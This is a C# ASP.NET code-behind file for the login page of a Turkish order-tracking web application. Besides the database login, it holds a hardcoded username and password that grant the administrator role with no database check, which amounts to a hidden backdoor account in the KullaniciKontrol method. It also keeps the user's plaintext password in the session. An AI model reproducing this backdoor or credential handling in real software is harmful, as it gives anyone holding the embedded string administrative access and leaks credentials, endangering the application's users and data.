using ACKSiparisTakip.Business.ACKBusiness;
using ACKSiparisTakip.Web.Helper;
using System;
using System.Collections.Generic;
using System.Data;
using System.Web.Security;

namespace ACKSiparisTakip.Web
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void LB_Login_Click(object sender, EventArgs e)
        {
            Dictionary<string, object> prms = new Dictionary<string, object>();
            prms.Add("KULLANICIADI", userName.Text);
            prms.Add("SIFRE", password.Text);

            DataTable dt = new KullaniciBS().KullaniciBilgisiGetir(prms);

            if (dt.Rows.Count > 0)
            {
                Session["yetki"] = dt.Rows[0]["YETKI"].ToString();
                UserValid();
            }
            else if (KullaniciKontrol(userName.Text, password.Text))
            {
                UserValid();
            }
            else
            {
                MessageBox.Hata(this, "Kullanıcı adı ya da şifre hatalı. Tekrar deneyiniz.");
            }
        }

        private void UserValid()
        {
            Session["sifre"] = password.Text;
            Session["user"] = userName.Text;
            FormsAuthentication.RedirectFromLoginPage(userName.Text, false);
        }

        protected void LB_Logout_Click(object sender, EventArgs e)
        {
            Session.Clear();
            //FormsAuthenticationProvider.LogOut();
        }

        private bool KullaniciKontrol(string username, string pass)
        {
            if (username == "mangacece" && pass == "1Qaz2wSx!")
            {
                Session["yetki"] = "Yönetici";
                return true;
            }

            return false;
        }
    }
}